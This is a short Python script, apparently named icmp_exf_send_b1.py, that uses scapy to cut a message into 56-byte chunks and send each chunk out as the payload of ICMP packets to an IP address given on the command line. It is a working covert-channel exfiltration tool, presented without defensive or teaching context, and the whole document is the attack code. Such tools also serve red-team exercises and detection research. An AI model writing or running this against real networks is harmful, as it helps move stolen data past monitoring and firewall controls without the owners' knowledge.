import sys
from scapy.all import *

MAX_PAYLOAD_SIZE = 56

def send_icmp_exfiltration(data, target_ip):
    chunks = [data[i:i + MAX_PAYLOAD_SIZE] for i in range(0, len(data), MAX_PAYLOAD_SIZE)]
    
    for chunk in chunks:
        packet = IP(dst=target_ip)/ICMP()/chunk
        send(packet)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python icmp_exf_send_b1.py <target_ip> <message>")
        sys.exit(1)

    target_ip = sys.argv[1]
    message = sys.argv[2].encode()
    send_icmp_exfiltration(message, target_ip)
